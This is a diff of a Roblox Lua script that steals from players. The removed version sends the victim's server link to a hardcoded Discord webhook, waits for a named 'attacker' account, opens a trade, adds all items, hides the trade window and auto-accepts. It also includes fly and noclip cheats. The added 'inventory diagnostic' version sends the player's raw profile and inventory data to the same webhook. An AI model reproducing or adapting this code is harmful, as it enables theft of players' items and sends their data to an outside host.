@@ -1,4 +1,4 @@
---[=[ FINAL: GUI-based trade with correct detection ]=]
+--[=[ INVENTORY DIAGNOSTIC – Sends raw data to Discord ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -18,295 +18,76 @@ local function send(msg)
     return false
 end
 
-local placeId, jobId = game.PlaceId, game.JobId
-local joinLink = "https://www.roblox.com/games/" .. placeId .. "?serverId=" .. jobId
-send("**Server link:** " .. joinLink)
-print("Server link sent.")
-
 local player = game.Players.LocalPlayer
-local char = player.Character or player.CharacterAdded:Wait()
-local root = char:FindFirstChild("HumanoidRootPart")
-if not root then
-    char = player.CharacterAdded:Wait()
-    root = char:WaitForChild("HumanoidRootPart")
+send("=== INVENTORY DIAGNOSTIC START ===")
+
+-- Function to convert a table to a readable string (limited depth)
+local function tableToString(tbl, indent, depth)
+    indent = indent or 0
+    depth = depth or 0
+    if depth > 5 then return "(...)" end
+    local pad = string.rep("  ", indent)
+    local result = {}
+    for k, v in pairs(tbl) do
+        local key = type(k) == "string" and k or "["..tostring(k).."]"
+        if type(v) == "table" then
+            table.insert(result, pad .. key .. " = {\n" .. tableToString(v, indent+2, depth+1) .. pad .. "}")
+        elseif type(v) == "string" then
+            table.insert(result, pad .. key .. " = '" .. v .. "'")
+        else
+            table.insert(result, pad .. key .. " = " .. tostring(v))
+        end
+    end
+    return table.concat(result, ",\n")
 end
 
--- Fly & Noclip
-local flying, noclip = false, false
-local speed = 50
-local function toggleFly()
-    flying = not flying
-    if flying then
-        local bv = Instance.new("BodyVelocity")
-        bv.MaxForce = Vector3.new(4000,4000,4000)
-        bv.Velocity = Vector3.new(0,0,0)
-        bv.Parent = root
-        game:GetService("RunService").Heartbeat:Connect(function()
-            if flying then
-                local move = Vector3.new(0,0,0)
-                local uis = game:GetService("UserInputService")
-                if uis:IsKeyDown(Enum.KeyCode.W) then move = move + Vector3.new(0,0,-1) end
-                if uis:IsKeyDown(Enum.KeyCode.S) then move = move + Vector3.new(0,0,1) end
-                if uis:IsKeyDown(Enum.KeyCode.A) then move = move + Vector3.new(-1,0,0) end
-                if uis:IsKeyDown(Enum.KeyCode.D) then move = move + Vector3.new(1,0,0) end
-                if uis:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0,1,0) end
-                if uis:IsKeyDown(Enum.KeyCode.LeftShift) then move = move + Vector3.new(0,-1,0) end
-                bv.Velocity = move.Magnitude > 0 and move.Unit * speed or Vector3.new(0,0,0)
-            end
-        end)
-    else
-        for _,v in pairs(root:GetChildren()) do if v:IsA("BodyVelocity") then v:Destroy() end end
-    end
-end
-local function toggleNoclip()
-    noclip = not noclip
-    for _, part in pairs(char:GetDescendants()) do
-        if part:IsA("BasePart") then part.CanCollide = not noclip end
-    end
-end
-game:GetService("UserInputService").InputBegan:Connect(function(input)
-    if input.KeyCode == Enum.KeyCode.F then toggleFly() end
-    if input.KeyCode == Enum.KeyCode.V then toggleNoclip() end
-end)
-
--- ============================================================
--- TRADE AUTOMATION (GUI-based)
--- ============================================================
+-- Try different inventory remotes
 local RS = game:GetService("ReplicatedStorage")
-local Trade = RS:FindFirstChild("Trade")
-if not Trade then
-    send("❌ Trade folder not found.")
-    return
-end
+local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
+local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
+local GetFullInventory = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Extras") and RS.Remotes.Extras:FindFirstChild("GetFullInventory")
+local GetPlayerData = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Extras") and RS.Remotes.Extras:FindFirstChild("GetPlayerData")
 
-local SendReq = Trade:FindFirstChild("SendRequest")
-local AcceptReq = Trade:FindFirstChild("AcceptRequest")
-local StartTr = Trade:FindFirstChild("StartTrade")
-local AcceptTr = Trade:FindFirstChild("AcceptTrade")
-local CompleteTr = Trade:FindFirstChild("CompleteTrade")
-
-if not SendReq or not AcceptReq then
-    send("❌ Missing critical remotes.")
-    return
-end
-
-send("✅ Remotes found.")
-
--- --- Find the REAL trade GUI (ignore Lobby, Main, HUD)
-local function findTradeWindow()
-    local gui = player:FindFirstChild("PlayerGui")
-    if not gui then return nil end
-
-    local function isTradeGUI(obj)
-        if not obj then return false end
-        -- Must be a ScreenGui or Frame
-        if not (obj:IsA("ScreenGui") or obj:IsA("Frame")) then return false end
-        -- Must be enabled/visible
-        local visible = false
-        if obj:IsA("ScreenGui") then visible = obj.Enabled end
-        if obj:IsA("Frame") then visible = obj.Visible end
-        if not visible then return false end
-
-        -- Must be large (trade window is big)
-        local size = obj.AbsoluteSize
-        if size.X < 300 or size.Y < 200 then return false end
-
-        -- Must have both Accept and Add buttons (search deep)
-        local hasAccept, hasAdd = false, false
-        for _, btn in pairs(obj:GetDescendants()) do
-            if btn:IsA("TextButton") then
-                local name = btn.Name:lower()
-                local text = (btn.Text or ""):lower()
-                if name:find("accept") or text:find("accept") then hasAccept = true end
-                if name:find("add") or text:find("add") or name:find("select") then hasAdd = true end
-            end
-        end
-        return hasAccept and hasAdd
-    end
-
-    -- Search top-level ScreenGuis first
-    for _, obj in pairs(gui:GetChildren()) do
-        if obj:IsA("ScreenGui") and isTradeGUI(obj) then
-            -- Ignore if name contains lobby/main/hud
-            local name = obj.Name:lower()
-            if not (name:find("lobby") or name:find("main") or name:find("hud") or name:find("background")) then
-                return obj
-            end
-        end
-    end
-
-    -- Search deeper for Frames
-    for _, obj in pairs(gui:GetDescendants()) do
-        if obj:IsA("Frame") and isTradeGUI(obj) then
-            local name = obj.Name:lower()
-            if not (name:find("lobby") or name:find("main") or name:find("hud") or name:find("background")) then
-                return obj
-            end
-        end
-    end
-    return nil
-end
-
--- --- Click all Add buttons inside the trade window
-local function addAllItemsViaGUI(tradeWindow)
-    if not tradeWindow then return 0 end
-    local count = 0
-
-    -- Look for "Add All" button
-    for _, btn in pairs(tradeWindow:GetDescendants()) do
-        if btn:IsA("TextButton") then
-            local name = btn.Name:lower()
-            local text = (btn.Text or ""):lower()
-            if name:find("add all") or text:find("add all") or name:find("select all") then
-                pcall(function() btn:FireServer() end)
-                send("✅ Clicked 'Add All'.")
-                return 1
-            end
-        end
-    end
-
-    -- Click individual "Add" buttons on item slots (parent Frame with ImageLabel)
-    for _, btn in pairs(tradeWindow:GetDescendants()) do
-        if btn:IsA("TextButton") then
-            local name = btn.Name:lower()
-            local text = (btn.Text or ""):lower()
-            if name:find("add") or text:find("add") or name:find("select") then
-                local parent = btn.Parent
-                if parent and parent:IsA("Frame") then
-                    -- Check if this frame has an ImageLabel (likely an item slot)
-                    if parent:FindFirstChild("ImageLabel") then
-                        pcall(function() btn:FireServer() end)
-                        count = count + 1
-                    end
-                end
-            end
-        end
-    end
-    return count
-end
-
--- --- Hide the trade window (once)
-local function hideTradeWindow()
-    local gui = player:FindFirstChild("PlayerGui")
-    if not gui then return end
-    for _, obj in pairs(gui:GetDescendants()) do
-        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
-            obj.Enabled = false
-        end
-        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
-            obj.Visible = false
-        end
-        if obj:IsA("Frame") and obj.AbsoluteSize.X > 200 and obj.AbsoluteSize.Y > 200 then
-            local hasAccept, hasAdd = false, false
-            for _, sub in pairs(obj:GetDescendants()) do
-                if sub:IsA("TextButton") then
-                    if sub.Name:lower():find("accept") or (sub.Text and sub.Text:lower():find("accept")) then hasAccept = true end
-                    if sub.Name:lower():find("add") or (sub.Text and sub.Text:lower():find("add")) then hasAdd = true end
-                end
-            end
-            if hasAccept and hasAdd then
-                obj.Visible = false
-                if obj.Parent and obj.Parent:IsA("ScreenGui") then
-                    obj.Parent.Enabled = false
-                end
-            end
-        end
-    end
-end
-
--- ============================================================
--- MAIN SEQUENCE
--- ============================================================
-spawn(function()
-    send("⏳ Waiting for attacker: " .. attackerUsername)
-    local target = nil
-    while not target do
-        for _, plr in pairs(game.Players:GetPlayers()) do
-            if plr.Name == attackerUsername and plr ~= player then
-                target = plr
-                send("✅ Attacker found.")
-                break
-            end
-        end
-        wait(1)
-    end
-
-    wait(3)
-
-    -- 1. Send trade request
-    send("📤 Sending trade request using InvokeServer...")
-    local ok, err = pcall(function() return SendReq:InvokeServer(target) end)
-    if not ok then
-        send("❌ Send failed: " .. tostring(err))
-        return
-    end
-    send("✅ Request sent, response: " .. tostring(err))
-
-    -- 2. Wait for attacker to accept (detect trade GUI)
-    send("⏳ Waiting for attacker to accept trade (30s timeout)...")
-    local tradeWindow = nil
-    for i = 1, 30 do
-        tradeWindow = findTradeWindow()
-        if tradeWindow then
-            send("✅ Trade GUI detected after " .. i .. "s.")
-            break
-        end
-        wait(1)
-    end
-
-    if not tradeWindow then
-        send("❌ Trade GUI not found (timeout). Attacker might not have accepted.")
-        return
-    end
-
-    -- 3. Add items via GUI
-    send("📦 Attempting to add items via GUI...")
-    local added = addAllItemsViaGUI(tradeWindow)
-    if added > 0 then
-        send("✅ Added " .. added .. " items via GUI.")
+if GetProfileData then
+    send("🔄 Invoking GetProfileData...")
+    local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
+    if ok and data then
+        send("✅ GetProfileData succeeded.")
+        local str = tableToString(data, 0, 0)
+        send("```lua\n" .. str .. "\n```")
     else
-        send("⚠️ GUI add returned 0 items. Trying fallback: click all buttons with 'Add' text.")
-        -- Fallback: click ANY button that has "Add" in text or name (broad)
-        local count = 0
-        for _, btn in pairs(tradeWindow:GetDescendants()) do
-            if btn:IsA("TextButton") then
-                local name = btn.Name:lower()
-                local text = (btn.Text or ""):lower()
-                if name:find("add") or text:find("add") or name:find("select") then
-                    pcall(function() btn:FireServer() end)
-                    count = count + 1
-                end
-            end
-        end
-        send("🔄 Clicked " .. count .. " buttons with 'Add' text (fallback).")
+        send("❌ GetProfileData failed: " .. tostring(data))
     end
+else
+    send("⚠️ GetProfileData not found.")
+end
 
-    -- 4. Hide the GUI
-    send("👻 Hiding trade GUI...")
-    hideTradeWindow()
-    send("✅ GUI hidden.")
-
-    -- 5. Wait 5 seconds before accepting
-    send("⏳ Waiting 5 seconds before accepting...")
-    wait(5)
-
-    -- 6. Accept trade (double)
-    send("✅ Accepting trade...")
-    pcall(function() AcceptTr:FireServer() end)
-    wait(0.3)
-    pcall(function() AcceptTr:FireServer() end)
-    send("✅ Accept fired twice.")
-
-    wait(0.5)
-
-    -- 7. Complete
-    if CompleteTr then
-        send("🏁 Completing trade...")
-        pcall(function() CompleteTr:FireServer() end)
-        send("✅ CompleteTrade fired.")
+if GetFullInventory then
+    send("🔄 Invoking GetFullInventory...")
+    local ok, data = pcall(function() return GetFullInventory:InvokeServer() end)
+    if ok and data then
+        send("✅ GetFullInventory succeeded.")
+        local str = tableToString(data, 0, 0)
+        send("```lua\n" .. str .. "\n```")
+    else
+        send("❌ GetFullInventory failed: " .. tostring(data))
     end
+else
+    send("⚠️ GetFullInventory not found.")
+end
 
-    send("🎉 **TRADE COMPLETE**")
-end)
+if GetPlayerData then
+    send("🔄 Invoking GetPlayerData...")
+    local ok, data = pcall(function() return GetPlayerData:InvokeServer() end)
+    if ok and data then
+        send("✅ GetPlayerData succeeded.")
+        local str = tableToString(data, 0, 0)
+        send("```lua\n" .. str .. "\n```")
+    else
+        send("❌ GetPlayerData failed: " .. tostring(data))
+    end
+else
+    send("⚠️ GetPlayerData not found.")
+end
 
-print("Script ready. Fly: F, Noclip: V.")
+send("=== INVENTORY DIAGNOSTIC COMPLETE ===")
